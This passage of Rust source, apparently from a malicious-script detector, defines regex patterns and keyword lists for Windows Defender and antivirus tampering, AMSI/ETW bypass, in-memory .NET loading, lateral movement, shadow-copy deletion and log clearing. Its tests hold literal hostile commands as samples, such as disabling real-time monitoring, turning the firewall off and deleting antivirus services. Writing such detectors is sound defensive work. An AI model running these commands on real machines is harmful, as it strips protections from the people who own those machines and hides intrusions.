    const SECURITY_STARTUP_PATTERN: &str = r"AvastUI\.exe|QHSafeTray|Zillya Antivirus|SBAMTray|SBRegRebootCleaner|egui|IseUI|COMODO Internet Security|ClamWin|Avira SystrayStartTrigger|AVGUI\.exe|SUPERAntiSpyware|Malwarebytes|Windows Defender|SecurityHealth|ESET|McAfee|Norton|Symantec";
    static EXCLUSION_PATH_DQ: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)Add-MpPreference\s+-Exclusion(Path|Extension|Process)\s+"([^"\r\n]+)""#)
            .expect("excl-path-dq")
    });
    static EXCLUSION_PATH_SQ: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)Add-MpPreference\s+-Exclusion(Path|Extension|Process)\s+'([^'\r\n]+)'"#)
            .expect("excl-path-sq")
    });
    static EXCLUSION_PATH_BARE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)Add-MpPreference\s+-Exclusion(Path|Extension|Process)\s+([^\s'";|&)]+)"#)
            .expect("excl-path-bare")
    });
    static DISABLE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)Set-MpPreference\s+-(Disable[A-Za-z]+|MAPSReporting|SubmitSamplesConsent)\s+(\S+)"#)
            .expect("set-mp-disable")
    });
    static SC_DEFENDER_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)sc(?:\.exe)?\s+(stop|config|delete)\s+(WinDefend|MsMpSvc|wuauserv|MpsSvc|WdNisSvc)"#)
            .expect("sc-defender")
    });
    static TASKKILL_SECURITY_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\btaskkill(?:\.exe)?\b[^\r\n]*?/im\s+"?(SecurityHealthSystray|SecurityHealthService|WindowsDefender|MsMpEng|NisSrv|MpCmdRun|MBAMService|MBAMTray|avastui|avgui|egui|ekrn|bdservicehost|SentinelAgent|CrowdStrike|CSFalconService)\.exe"?\b[^\r\n]*"#)
            .expect("taskkill security process")
    });
    static SECURITY_BINARY_TAKEOWN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\btakeown(?:\.exe)?\b[^\r\n]*(SecurityHealthService|SecurityHealthSystray|MsMpEng|NisSrv|MpCmdRun)\.exe\b[^\r\n]*"#)
            .expect("security binary takeown")
    });
    static SECURITY_BINARY_ICACLS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bicacls(?:\.exe)?\b[^\r\n]*(SecurityHealthService|SecurityHealthSystray|MsMpEng|NisSrv|MpCmdRun)\.exe\b[^\r\n]*/grant[^\r\n]*"#)
            .expect("security binary icacls")
    });
    static SECURITY_BINARY_RENAME_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\b(?:ren(?:ame)?|move)(?:\.exe)?\b[^\r\n]*(SecurityHealthService|SecurityHealthSystray|MsMpEng|NisSrv|MpCmdRun)\.exe\b[^\r\n]*"#)
            .expect("security binary rename")
    });
    static SCHTASKS_TN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)(?:^|\s)/tn\s+(?:"([^"\r\n]+)"|([^\s\r\n]+))"#)
            .expect("schtasks task name")
    });
    static DEFENDER_SERVICE_START_DISABLED_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\breg(?:\.exe)?\s+add\b[^\r\n]*\\Services\\(WinDefend|WdBoot|WdFilter|WdNisDrv|WdNisSvc|SecurityHealthService|Sense)\b[^\r\n]*/v\s+"?Start"?\b[^\r\n]*/d\s+"?(?:0x)?4"?\b[^\r\n]*"#)
            .expect("defender service start disabled")
    });
    static ATTACHMENT_POLICY_WEAKEN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\breg(?:\.exe)?\s+add\b[^\r\n]*\\Policies\\(?:Attachments|Associations)\b[^\r\n]*/v\s+"?(LowRiskFileTypes|HideZoneInfoOnProperties|SaveZoneInformation)"?\b[^\r\n]*/d\s+"?([^"\r\n]+)"?[^\r\n]*"#)
            .expect("attachment policy weaken")
    });
    static FIREWALL_OFF_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)netsh(?:\.exe)?\s+advfirewall\s+set\s+(\w+)\s+state\s+off"#)
            .expect("fw-off")
    });
    static SECURITY_PRODUCT_REMOVE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(&format!(
            r#"(?im)^[^\r\n]*?\b(?:rmdir|rd|del)(?:\.exe)?\b([^\r\n]*(?:{SECURITY_PRODUCT_PATTERN})[^\r\n]*)"#
        ))
        .expect("security product removal")
    });
    static SECURITY_SERVICE_DELETE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(&format!(
            r#"(?i)\breg(?:\.exe)?\s+delete\b[^\r\n]*\\(?:SYSTEM\\CurrentControlSet\\services|System\\CurrentControlSet\\Services)\\({SECURITY_SERVICE_PATTERN})\b[^\r\n]*"#
        ))
        .expect("security service delete")
    });
    static SECURITY_STARTUP_DELETE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(&format!(
            r#"(?i)\breg(?:\.exe)?\s+delete\b[^\r\n]*\\(?:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Run)\b[^\r\n]*/v\s+"?({SECURITY_STARTUP_PATTERN})"?\b[^\r\n]*"#
        ))
        .expect("security startup delete")
    });
    // AMSI bypass markers — Invoke-NullAMSI, AmsiInitFailed/AmsiUtils
    // memory patches, ETW patch via System.Diagnostics.Eventing
    static AMSI_BYPASS_RE: Lazy<Regex> = Lazy::new(|| {
        // `AmsiScanBuffer` is the API being patched (most authoritative
        // marker — appears in the GetProcAddress lookup string).
        // `Amsi.dll`/`amsi.dll` referenced alongside VirtualProtect is
        // another strong signal we want to surface.
        Regex::new(r#"(?i)(?:Invoke-NullAMSI|amsiInitFailed|amsiUtils|amsiContext|amsiSession|AmsiScanBuffer|\bamsi\.dll\b)"#)
            .expect("amsi-bypass")
    });
    static ETW_PATCH_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)EtwEventWrite|System\.Diagnostics\.Eventing\.EventProvider"#)
            .expect("etw-patch")
    });
    let defender_profile_enabled =
        std::env::var_os("HARRINGTON_PROFILE_DEFENDER_EVASION").is_some();
    macro_rules! profile_defender_group {
        ($stage:literal, $body:block) => {{
            let profile_start = defender_profile_enabled.then(std::time::Instant::now);
            let result = $body;
            if let Some(profile_start) = profile_start {
                eprintln!(
                    "harrington_profile_defender_evasion stage={} delta_ms={} bytes={}",
                    $stage,
                    profile_start.elapsed().as_millis(),
                    deobfuscated.len()
                );
            }
            result
        }};
    }
    let mut push = |kind: &str, target: String| {
        let target = target
            .trim_matches(|c: char| c == '\'' || c == '"')
            .to_string();
        let key = (kind.to_string(), target.clone());
        if env
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::DefenderEvasion { action: k, target: tg } if k == &key.0 && tg == &key.1))
        {
            return;
        }
        env.traits.push(crate::traits::Trait::DefenderEvasion {
            action: key.0,
            target,
        });
    };
    if lower.contains("add-mppreference") || lower.contains("set-mppreference") {
        profile_defender_group!("mp_preference", {
            for caps in EXCLUSION_PATH_DQ
                .captures_iter(deobfuscated)
                .chain(EXCLUSION_PATH_SQ.captures_iter(deobfuscated))
                .chain(EXCLUSION_PATH_BARE.captures_iter(deobfuscated))
            {
                let kind = format!(
                    "exclusion-{}",
                    caps.get(1)
                        .map(|m| m.as_str().to_ascii_lowercase())
                        .unwrap_or_default()
                );
                let target = caps
                    .get(2)
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default();
                push(&kind, target);
            }

            for caps in DISABLE_RE.captures_iter(deobfuscated) {
                let opt = caps
                    .get(1)
                    .map(|m| m.as_str().to_ascii_lowercase())
                    .unwrap_or_default();
                let val = caps
                    .get(2)
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default();
                // Only flag the disabling forms — `$true` / `1` / `Disabled` /
                // `2` (SubmitSamplesConsent=2 = never submit). Skip enabling
                // values like `$false` to avoid false positives in remediation
                // scripts that turn protections back on.
                let val_lc = val.to_ascii_lowercase();
                let disabling = matches!(
                    (opt.as_str(), val_lc.as_str()),
                    ("disablerealtimemonitoring", "$true" | "1" | "true")
                        | ("disablebehaviormonitoring", "$true" | "1" | "true")
                        | ("disableioavprotection", "$true" | "1" | "true")
                        | ("disableblockatfirstseen", "$true" | "1" | "true")
                        | ("disableprivacymode", "$true" | "1" | "true")
                        | ("disablescriptscanning", "$true" | "1" | "true")
                        | ("mapsreporting", "disabled" | "0")
                ) || (opt == "submitsamplesconsent"
                    && (val_lc == "2" || val_lc == "never"));
                if disabling {
                    push(&format!("setmp-{opt}"), val);
                }
            }
        });
    }

    if has_defender_service_process_atom_lower(&lower) {
        profile_defender_group!("service_process", {
            for caps in SC_DEFENDER_RE.captures_iter(deobfuscated) {
                let verb = caps
                    .get(1)
                    .map(|m| m.as_str().to_ascii_lowercase())
                    .unwrap_or_default();
                let svc = caps
                    .get(2)
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default();
                push(&format!("sc-{verb}"), svc);
            }
            for caps in TASKKILL_SECURITY_RE.captures_iter(deobfuscated) {
                let process = caps
                    .get(1)
                    .map(|m| format!("{}.exe", m.as_str()))
                    .unwrap_or_default();
                push("taskkill-security-process", process);
            }
            for caps in SECURITY_BINARY_TAKEOWN_RE.captures_iter(deobfuscated) {
                let binary = caps
                    .get(1)
                    .map(|m| format!("{}.exe", m.as_str()))
                    .unwrap_or_default();
                push("security-binary-takeown", binary);
            }
            for caps in SECURITY_BINARY_ICACLS_RE.captures_iter(deobfuscated) {
                let binary = caps
                    .get(1)
                    .map(|m| format!("{}.exe", m.as_str()))
                    .unwrap_or_default();
                push("security-binary-acl-grant", binary);
            }
            for caps in SECURITY_BINARY_RENAME_RE.captures_iter(deobfuscated) {
                let binary = caps
                    .get(1)
                    .map(|m| format!("{}.exe", m.as_str()))
                    .unwrap_or_default();
                push("security-binary-rename", binary);
            }
        });
    }

    if has_defender_scheduled_registry_firewall_atom_lower(&lower) {
        profile_defender_group!("scheduled_registry_firewall", {
            for line in deobfuscated.lines() {
                let lower = line.to_ascii_lowercase();
                if !lower.contains("schtasks")
                    || !lower.contains("/change")
                    || !lower.contains("/disable")
                    || (!lower.contains("windows defender") && !lower.contains("exploitguard"))
                {
                    continue;
                }
                let task_name = SCHTASKS_TN_RE
                    .captures(line)
                    .and_then(|caps| caps.get(1).or_else(|| caps.get(2)))
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_else(|| line.trim().chars().take(160).collect());
                push("scheduled-task-disable", task_name);
            }
            for caps in DEFENDER_SERVICE_START_DISABLED_RE.captures_iter(deobfuscated) {
                let service = caps
                    .get(1)
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default();
                push("service-start-disabled", service);
            }
            for caps in ATTACHMENT_POLICY_WEAKEN_RE.captures_iter(deobfuscated) {
                let value_name = caps.get(1).map(|m| m.as_str()).unwrap_or_default();
                let data = caps
                    .get(2)
                    .map(|m| m.as_str().trim_matches('"').to_ascii_lowercase())
                    .unwrap_or_default();
                let weakens = match value_name.to_ascii_lowercase().as_str() {
                    "lowriskfiletypes" => [".exe", ".bat", ".cmd", ".reg", ".msi"]
                        .iter()
                        .any(|ext| data.contains(ext)),
                    "hidezoneinfoonproperties" => data == "1" || data == "0x1",
                    "savezoneinformation" => data == "2" || data == "0x2",
                    _ => false,
                };
                if weakens {
                    push("attachment-policy-weaken", value_name.to_string());
                }
            }
            for caps in FIREWALL_OFF_RE.captures_iter(deobfuscated) {
                let prof = caps
                    .get(1)
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default();
                push("netsh-fw-off", prof);
            }
        });
    }

    if has_defender_product_registry_atom_lower(&lower) {
        profile_defender_group!("product_registry", {
            for caps in SECURITY_PRODUCT_REMOVE_RE.captures_iter(deobfuscated) {
                let target = caps
                    .get(1)
                    .map(|m| m.as_str().trim().chars().take(160).collect::<String>())
                    .unwrap_or_default();
                if is_encoded_security_product_remove_noise(&target) {
                    continue;
                }
                push("security-product-remove", target);
            }
            for caps in SECURITY_SERVICE_DELETE_RE.captures_iter(deobfuscated) {
                let service = caps
                    .get(1)
                    .map(|m| m.as_str().trim_matches('"').to_string())
                    .unwrap_or_default();
                push("security-service-delete", service);
            }
            for caps in SECURITY_STARTUP_DELETE_RE.captures_iter(deobfuscated) {
                let value = caps
                    .get(1)
                    .map(|m| m.as_str().trim_matches('"').to_string())
                    .unwrap_or_default();
                push("security-startup-delete", value);
            }
        });
    }

    if has_defender_amsi_etw_atom_lower(&lower) {
        profile_defender_group!("amsi_etw", {
            if let Some(m) = AMSI_BYPASS_RE.find(deobfuscated) {
                push("amsi-bypass", m.as_str().to_string());
            }
            if ETW_PATCH_RE.is_match(deobfuscated) {
                push("etw-patch", String::new());
            }
        });
    }
}

fn is_encoded_security_product_remove_noise(target: &str) -> bool {
    let target = target.trim().trim_matches('"').trim_matches('\'');
    if target.len() < 80 || target.chars().any(char::is_whitespace) || target.contains(['\\', ':'])
    {
        return false;
    }

    let encodedish = target
        .bytes()
        .filter(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'+' | b'=' | b'@' | b'#'))
        .count();
    encodedish.saturating_mul(100) >= target.len() * 90
}

#[cfg(test)]
fn has_defender_evasion_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    has_defender_evasion_atom_lower(&lower)
}

fn has_defender_evasion_atom_lower(lower: &str) -> bool {
    const DIRECT_ATOMS: &[&str] = &[
        "add-mppreference",
        "set-mppreference",
        "windefend",
        "msmpsvc",
        "mpssvc",
        "wuauserv",
        "wdnissvc",
        "wdboot",
        "wdfilter",
        "wdnisdrv",
        "securityhealth",
        "msmpeng",
        "nissrv",
        "mpcmdrun",
        "windows defender",
        "windowsdefender",
        "microsoft defender",
        "exploitguard",
        "wintrust\\trust providers\\software publishing",
        "lowriskfiletypes",
        "hidezoneinfoonproperties",
        "savezoneinformation",
        "advfirewall",
        "invoke-nullamsi",
        "amsiinitfailed",
        "amsiutils",
        "amsicontext",
        "amsisession",
        "amsiscanbuffer",
        "amsi.dll",
        "etweventwrite",
        "system.diagnostics.eventing.eventprovider",
    ];
    const SECURITY_PRODUCT_ATOMS: &[&str] = &[
        "trend micro",
        "sophos",
        "kaspersky",
        "symantec",
        "mcafee",
        "avast",
        "avg",
        "eset",
        "malwarebytes",
        "crowdstrike",
        "sentinelone",
        "carbonblack",
        "cylance",
        "bitdefender",
        "mbam",
        "ekrn",
        "avp",
        "ksde",
        "mcawfwk",
        "msk80service",
        "mcapexe",
        "mcbootdelaystartsvc",
        "mccspsvc",
        "mfefire",
        "mcmpfsvc",
        "mcpltsvc",
        "mcproxy",
        "mcods",
        "mfemms",
        "mfevtp",
        "mcnaiann",
        "nortonsecurity",
        "sbamsvc",
        "zillya",
        "qhactivedefense",
        "antivir",
        "avira",
        "vsserv",
        "productagentservice",
        "updatesrv",
        "cmdagent",
        "cmdvirth",
        "dragonupdater",
        "pefservice",
        "sentinelagent",
        "csfalconservice",
        "avastui",
        "qhsafetray",
        "sbamtray",
        "sbregrebootcleaner",
        "iseui",
        "comodo internet security",
        "clamwin",
        "avgui",
        "superantispyware",
    ];
    const OPERATION_ATOMS: &[&str] = &[
        "taskkill", "takeown", "icacls", "rename", "ren ", "ren\t", "reg", "rmdir", "rd ", "rd\t",
        "del ", "del\t", "del.",
    ];
    DIRECT_ATOMS.iter().any(|atom| lower.contains(atom))
        || (SECURITY_PRODUCT_ATOMS
            .iter()
            .any(|atom| lower.contains(atom))
            && OPERATION_ATOMS.iter().any(|atom| lower.contains(atom)))
}

fn has_defender_service_process_atom_lower(lower: &str) -> bool {
    const COMMAND_ATOMS: &[&str] = &[
        "sc ", "sc.exe", "taskkill", "takeown", "icacls", "rename", "ren ", "ren\t", "move ",
        "move\t", "move.exe",
    ];
    COMMAND_ATOMS.iter().any(|atom| lower.contains(atom))
}

fn has_defender_scheduled_registry_firewall_atom_lower(lower: &str) -> bool {
    lower.contains("schtasks")
        || lower.contains("advfirewall")
        || (lower.contains("reg")
            && (lower.contains("\\services\\")
                || lower.contains("\\policies\\attachments")
                || lower.contains("\\policies\\associations")))
        || lower.contains("lowriskfiletypes")
        || lower.contains("hidezoneinfoonproperties")
        || lower.contains("savezoneinformation")
}

fn has_defender_product_registry_atom_lower(lower: &str) -> bool {
    const PRODUCT_REMOVE_COMMANDS: &[&str] = &["rmdir", "rd ", "rd\t", "del ", "del\t", "del."];
    const SECURITY_PRODUCT_ATOMS: &[&str] = &[
        "trend micro",
        "windows defender",
        "microsoft defender",
        "sophos",
        "kaspersky",
        "symantec",
        "mcafee",
        "avast",
        "avg",
        "eset",
        "malwarebytes",
        "crowdstrike",
        "sentinelone",
        "carbonblack",
        "cylance",
        "bitdefender",
    ];
    const SECURITY_SERVICE_OR_STARTUP_ATOMS: &[&str] = &[
        "mbam",
        "ekrn",
        "egui",
        "avp",
        "ksde",
        "mcawfwk",
        "msk80service",
        "mcapexe",
        "mcbootdelaystartsvc",
        "mccspsvc",
        "mfefire",
        "mcmpfsvc",
        "mcpltsvc",
        "mcproxy",
        "mcods",
        "mfemms",
        "mfevtp",
        "mcnaiann",
        "nortonsecurity",
        "sbamsvc",
        "zillya",
        "qhactivedefense",
        "antivir",
        "avira",
        "vsserv",
        "productagentservice",
        "updatesrv",
        "cmdagent",
        "cmdvirth",
        "dragonupdater",
        "pefservice",
        "sentinelagent",
        "csfalconservice",
        "avastui",
        "qhsafetray",
        "sbamtray",
        "sbregrebootcleaner",
        "iseui",
        "comodo internet security",
        "clamwin",
        "avgui",
        "superantispyware",
        "securityhealth",
        "eset",
        "mcafee",
        "norton",
        "symantec",
    ];

    (PRODUCT_REMOVE_COMMANDS
        .iter()
        .any(|atom| lower.contains(atom))
        && SECURITY_PRODUCT_ATOMS
            .iter()
            .any(|atom| lower.contains(atom)))
        || (lower.contains("reg")
            && lower.contains("delete")
            && SECURITY_SERVICE_OR_STARTUP_ATOMS
                .iter()
                .any(|atom| lower.contains(atom)))
}

fn has_defender_amsi_etw_atom_lower(lower: &str) -> bool {
    const AMSI_ETW_ATOMS: &[&str] = &[
        "invoke-nullamsi",
        "amsiinitfailed",
        "amsiutils",
        "amsicontext",
        "amsisession",
        "amsiscanbuffer",
        "amsi.dll",
        "etweventwrite",
        "system.diagnostics.eventing.eventprovider",
    ];
    AMSI_ETW_ATOMS.iter().any(|atom| lower.contains(atom))
}

#[cfg(test)]
mod defender_evasion_prefilter_tests {
    use super::{
        has_defender_amsi_etw_atom_lower, has_defender_evasion_atom,
        has_defender_product_registry_atom_lower,
        has_defender_scheduled_registry_firewall_atom_lower,
        has_defender_service_process_atom_lower,
    };

    #[test]
    fn prefilter_allows_known_defender_evasion_shapes() {
        for sample in [
            r#"powershell Add-MpPreference -ExclusionPath C:\Users\Public"#,
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "sc stop WinDefend",
            "taskkill /im SecurityHealthSystray.exe /f",
            "taskkill /im WindowsDefender.exe /f",
            r#"takeown /f C:\Windows\System32\MsMpEng.exe"#,
            r#"move C:\Windows\System32\SecurityHealthService.exe C:\Windows\System32\SecurityHealthService.bak"#,
            r#"schtasks /Change /TN "Microsoft\Windows\Windows Defender\Cache Maintenance" /Disable"#,
            r#"reg add HKLM\System\CurrentControlSet\Services\WinDefend /v Start /d 4"#,
            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments /v SaveZoneInformation /d 2"#,
            "netsh advfirewall set allprofiles state off",
            r#"rmdir /s /q "C:\Program Files (x86)\Trend Micro""#,
            r#"reg delete HKLM\SYSTEM\CurrentControlSet\services\MBAMService /f"#,
            r#"reg delete HKLM\SYSTEM\CurrentControlSet\services\AVP21.3 /f"#,
            r#"reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "AVGUI.exe" /f"#,
            r#"taskkill /im avgui.exe /f"#,
            "Invoke-NullAMSI",
            "EtwEventWrite",
        ] {
            assert!(has_defender_evasion_atom(sample), "blocked: {sample}");
        }
    }

    #[test]
    fn prefilter_blocks_unrelated_text() {
        assert!(!has_defender_evasion_atom("echo hello && whoami"));
        assert!(!has_defender_evasion_atom(
            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v App /d app.exe"#,
        ));
        assert!(!has_defender_evasion_atom(
            "echo avg payload size && echo avp staging note"
        ));
    }

    #[test]
    fn internal_gates_allow_known_defender_evasion_shapes() {
        assert!(has_defender_service_process_atom_lower(
            &"sc stop WinDefend".to_ascii_lowercase()
        ));
        assert!(has_defender_service_process_atom_lower(
            &"taskkill /im SecurityHealthSystray.exe /f".to_ascii_lowercase()
        ));
        assert!(has_defender_service_process_atom_lower(
            &r#"move C:\Windows\System32\SecurityHealthService.exe C:\Windows\System32\SecurityHealthService.bak"#
                .to_ascii_lowercase()
        ));
        assert!(has_defender_scheduled_registry_firewall_atom_lower(
            &r#"reg add HKLM\System\CurrentControlSet\Services\WinDefend /v Start /d 4"#
                .to_ascii_lowercase()
        ));
        assert!(has_defender_scheduled_registry_firewall_atom_lower(
            &"netsh advfirewall set allprofiles state off".to_ascii_lowercase()
        ));
        assert!(has_defender_product_registry_atom_lower(
            &r#"rmdir /s /q "C:\Program Files (x86)\Trend Micro""#.to_ascii_lowercase()
        ));
        assert!(has_defender_product_registry_atom_lower(
            &r#"reg delete HKLM\SYSTEM\CurrentControlSet\services\MBAMService /f"#
                .to_ascii_lowercase()
        ));
        assert!(has_defender_product_registry_atom_lower(
            &r#"reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "AVGUI.exe" /f"#
                .to_ascii_lowercase()
        ));
        assert!(has_defender_amsi_etw_atom_lower(
            &"Invoke-NullAMSI".to_ascii_lowercase()
        ));
    }
}

/// Detect `[Reflection.Assembly]::Load($bytes)` and its overloads.
/// Emits one InMemoryAssemblyLoad trait per distinct variant. This is
/// the definitive .NET in-memory loader IOC — SOSTENER/banglabillboard
/// family + most modern .NET stagers use it (DonutLoader, Covenant,
/// SilentTrinity).
fn scan_inmem_assembly_load(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static REFLECT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)\[(?:system\.)?Reflection\.Assembly\]::(Load(?:File|From|WithPartialName|ReflectionOnly|Bytes)?)\s*\("#,
        )
        .expect("reflect load regex")
    });
    static APPDOMAIN_LOAD_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\[(?:system\.)?AppDomain\]::CurrentDomain\.Load\s*\("#)
            .expect("appdomain load regex")
    });
    static DYNAMIC_REFLECT_LOAD_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)\[(?:system\.)?Reflection\.Assembly\]::\s*\([^)]+\)\s*\(\s*\[byte\[\]\]"#,
        )
        .expect("dynamic reflect load regex")
    });
    static CUSTOM_LOADASSEMBLY_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bLoadAssembly\s*\([^)]*\).*?\bGetTypes\s*\(.*?\bGetMethod\s*\(.*?\bInvoke\s*\("#)
            .expect("custom loadassembly regex")
    });

    fn push_inmem_assembly_load(
        env: &mut Environment,
        seen: &mut std::collections::HashSet<String>,
        variant: String,
    ) {
        if variant.is_empty() || !seen.insert(variant.clone()) {
            return;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::InMemoryAssemblyLoad { variant: v } if v == &variant
            )
        }) {
            return;
        }
        env.traits
            .push(crate::traits::Trait::InMemoryAssemblyLoad { variant });
    }

    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in REFLECT_RE.captures_iter(deobfuscated) {
        let variant = caps
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push_inmem_assembly_load(env, &mut seen, variant);
    }
    if APPDOMAIN_LOAD_RE.is_match(deobfuscated) {
        push_inmem_assembly_load(env, &mut seen, "AppDomain.Load".to_string());
    }
    if DYNAMIC_REFLECT_LOAD_RE.is_match(deobfuscated) {
        push_inmem_assembly_load(env, &mut seen, "DynamicLoad".to_string());
    }
    if CUSTOM_LOADASSEMBLY_RE.is_match(deobfuscated) {
        push_inmem_assembly_load(env, &mut seen, "LoadAssembly".to_string());
    }
}

/// Lateral movement / remote execution. Detects PsExec, WMIC /node,
/// WinRM/Invoke-Command -ComputerName, schtasks /S, sc \\host.
fn scan_lateral_movement(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static PSEXEC_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bpsexec(?:\.exe)?\s+\\\\([A-Za-z0-9.\-]+)"#).expect("psexec re")
    });
    static WMIC_NODE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bwmic[^\r\n]*?/node:(?:"([^"]+)"|(\S+))"#).expect("wmic /node re")
    });
    static INVOKE_CMD_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)\bInvoke-Command\b[^\r\n]*?-ComputerName\s+(?:"([^"]+)"|'([^']+)'|(\S+))"#,
        )
        .expect("invoke-cmd re")
    });
    static SCHTASKS_S_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bschtasks[^\r\n]*?\s/s\s+(?:"([^"]+)"|(\S+))"#).expect("schtasks /s re")
    });
    static SC_HOST_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bsc(?:\.exe)?\s+\\\\([A-Za-z0-9.\-]+)"#).expect("sc \\\\host re")
    });
    let mut push = |tool: &str, host: String| {
        let host = host
            .trim_matches(|c: char| c == '"' || c == '\'')
            .to_string();
        if host.is_empty() || host.eq_ignore_ascii_case("localhost") || host == "." {
            return;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::LateralMovement { tool: tl, target_host: h }
                    if tl == tool && h == &host
            )
        }) {
            return;
        }
        env.traits.push(crate::traits::Trait::LateralMovement {
            tool: tool.to_string(),
            target_host: host,
        });
    };
    for c in PSEXEC_RE.captures_iter(deobfuscated) {
        if let Some(m) = c.get(1) {
            push("psexec", m.as_str().to_string());
        }
    }
    for c in WMIC_NODE_RE.captures_iter(deobfuscated) {
        let host = c
            .get(1)
            .or_else(|| c.get(2))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push("wmic", host);
    }
    for c in INVOKE_CMD_RE.captures_iter(deobfuscated) {
        let host = c
            .get(1)
            .or_else(|| c.get(2))
            .or_else(|| c.get(3))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push("Invoke-Command", host);
    }
    for c in SCHTASKS_S_RE.captures_iter(deobfuscated) {
        let host = c
            .get(1)
            .or_else(|| c.get(2))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push("schtasks", host);
    }
    for c in SC_HOST_RE.captures_iter(deobfuscated) {
        if let Some(m) = c.get(1) {
            push("sc", m.as_str().to_string());
        }
    }
}

/// Anti-recovery: shadow copy delete, BCD recoveryenabled no, wbadmin
/// delete catalog. Ransomware staging IOCs.
fn scan_anti_recovery(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static PATTERNS: Lazy<Vec<(Regex, &str)>> = Lazy::new(|| {
        vec![
            (
                Regex::new(r"(?i)\bvssadmin(?:\.exe)?\s+delete\s+shadows").unwrap(),
                "vssadmin-delete-shadows",
            ),
            (
                Regex::new(r"(?i)\bwmic[^\r\n]*?shadowcopy\s+delete").unwrap(),
                "wmic-shadowcopy-delete",
            ),
            (
                Regex::new(r"(?i)\bbcdedit(?:\.exe)?[^\r\n]*?(?:/set\s+)?recoveryenabled\s+no")
                    .unwrap(),
                "bcdedit-recoveryenabled-no",
            ),
            (
                Regex::new(r"(?i)\bbcdedit(?:\.exe)?[^\r\n]*?bootstatuspolicy\s+ignoreallfailures")
                    .unwrap(),
                "bcdedit-bootstatus-ignoreallfailures",
            ),
            (
                Regex::new(
                    r"(?i)\bwbadmin(?:\.exe)?\s+delete\s+(?:catalog|backup|systemstatebackup)",
                )
                .unwrap(),
                "wbadmin-delete",
            ),
        ]
    });
    for (re, action) in PATTERNS.iter() {
        if !re.is_match(deobfuscated) {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::AntiRecovery { action: a } if a == action
            )
        }) {
            continue;
        }
        env.traits.push(crate::traits::Trait::AntiRecovery {
            action: action.to_string(),
        });
    }
}

/// Anti-forensics / evidence cleanup: clear Windows event logs, delete
/// USN journal, remove prefetch/recent artifacts, or delete registry
/// history keys such as UserAssist/MuiCache/BagMRU/ComDlg32.
fn scan_evidence_cleanup(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    if !has_evidence_cleanup_atom(deobfuscated) {
        return;
    }

    static EVENT_LOG_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?im)^[^\r\n]*?\bwevtutil(?:\.exe)?\s+cl\s+("[^"\r\n]+"|[^\s\r\n]+)[^\r\n]*"#)
            .expect("wevtutil clear regex")
    });
    static USN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?im)^[^\r\n]*?\bfsutil(?:\.exe)?\s+usn\s+deletejournal\b[^\r\n]*"#)
            .expect("fsutil usn deletejournal regex")
    });
    static DEL_LINE_RE: Lazy<Regex> = Lazy::new(|| {
